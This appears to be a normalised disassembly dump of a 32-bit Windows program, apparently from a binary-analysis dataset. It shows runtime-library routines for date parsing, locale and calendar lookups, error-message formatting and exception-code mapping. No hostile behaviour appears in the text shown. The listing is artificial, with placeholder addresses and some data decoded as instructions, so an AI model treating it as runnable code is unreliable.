mov edx ebx
mov eax esi
call sub_40a800
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a89c
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a638
mov eax esi
call sub_404268
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409a3c
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404268
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044c8
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407de0
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404268
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4044c8
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407de0
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40ac3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6f0
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6f0
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6f0
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a65c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a638
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6f0
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a77c
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a65c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6f0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a77c
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a638
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409618
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6f0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a65c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a6f0
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a77c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a6f0
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a65c
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ae30
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40ac3c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404268
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ae64
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a8f8
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ae30
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404268
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40ac3c
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40aef0
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_404098
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40af3c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403ffc
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_404098
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40af88
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40afb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40af3c
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405b88
sub_40afec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40b0ff
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40afb0
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ffc
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40afb0
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ffc
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40afb0
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ffc
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40afb0
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403ffc
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b106
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403fcc
retn
sub_40b110
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4041a0
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40b14c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40b1b1
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041a0
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_4080c8
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b1b8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
inc ebx
sub_40b1c4
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40b25b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40af3c
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_4080c8
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b262
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40b110
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40b14c
call EnumCalendarInfoA
sub_40b274
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b43e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403fa8
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40af3c
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4080c8
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404268
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b445
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fcc
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40881c
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c2e4
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4044c8
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_404270
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_403ffc
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_40881c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404270
inc ebx
jmp r-xdata
mov eax esi
call sub_404268
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40881c
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_404270
add ebx 0x3
jmp r-xdata
inc ebx
mov al [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404270
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_404270
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
mov dl [ esi + ebx - 0x1 ]
call sub_404190
mov edx [ ebp - 0xc ]
mov eax edi
call sub_404270
lea eax [ ebp - 0x14 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404190
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_404270
sub_40b4a8
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40b49c
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40c578
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_408740
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4050c0
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_4031a8
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_408d78
mov eax [ ebp - 0x4 ]
call sub_4086dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_404468
mov ebx eax
mov eax ebx
call sub_4086dc
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40b630
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40b4a8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_4050c0
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_402af0
call sub_402824
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_4086dc
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40b6f8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ffc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b734
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b78e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_408db8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b795
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
add esp 0xfffffff0
call sub_40357c
sub_40b795
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b7b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_405b88
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b7f0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40b85c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405b88
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408db8
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403ffc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b863
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
add esp 0xfffffff0
call sub_40357c
sub_40b863
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_40b8b0
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402898
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40b910
adc al 0xb9
inc eax
add [ esi ] cl
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_4039e4
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b6f8
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40b8b0
mov edx eax
sub_40b984
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ba20
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404040
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba27
lea eax [ ebp - 0x20 ]
call sub_403fa8
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40ba74
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bb0c
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bcc7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_404218
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4085ac
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bcce
lea eax [ ebp - 0x170 ]
call sub_403fa8
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403fcc
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_40bcd8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bd93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40ba74
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b6f8
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
push ebp
call sub_40bb0c
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bd9a
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
mov ebx eax
sub_40bdb4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bda4
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40baf4
mov eax [ rw-data ]
mov [ eax ] sub_40bcd8
mov eax sub_40ba40
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ba5c
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40be38
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_403258
xor eax eax
mov [ rw-data ] eax
sub_40beb8
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_404218
sub_40bf48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
